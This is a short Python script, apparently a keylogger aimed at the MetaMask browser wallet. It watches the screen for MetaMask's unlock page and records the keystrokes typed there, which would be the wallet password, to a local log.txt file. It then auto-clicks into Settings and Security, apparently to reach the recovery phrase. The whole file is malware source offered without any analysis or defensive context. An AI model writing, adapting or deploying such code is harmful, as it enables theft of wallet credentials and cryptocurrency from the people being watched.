from re import T
import pyautogui
import time
from asyncore import write
import pynput
from pynput.keyboard import Key, Listener



keys = []
key = ""
def on_press(key):
    global keys
    keys.append(key)
    print("{0} pressed".format(key))
    
def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            f.write(k)
        return False

def on_release(key):
    if(pyautogui.locateOnScreen('./img/unlock6.png')):
        print("Stop")
        return False
    if key == Key.esc:
        return False
    
while True:
    if(pyautogui.locateOnScreen('./img/unlock1.png')):
        print('Open MetaMask')
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
        if(pyautogui.locateOnScreen('./img/unlock6.png')):
            write_file(keys)
            print('Login MetaMask')
            time.sleep(2)
            pyautogui.click(1651,132)
            if(pyautogui.locateOnScreen('./img/unlock3.png')):
                print('My Accounts')
                time.sleep(1)
                pyautogui.click(1397,624)
                if(pyautogui.locateOnScreen('./img/unlock4.png')):
                    print('Settings')
                    time.sleep(1)
                    pyautogui.click(1409,507)
                    if(pyautogui.locateOnScreen('./img/unlock5.png')):
                        print('Security')
                        time.sleep(1)
                        pyautogui.click(1465,400)
        
        

        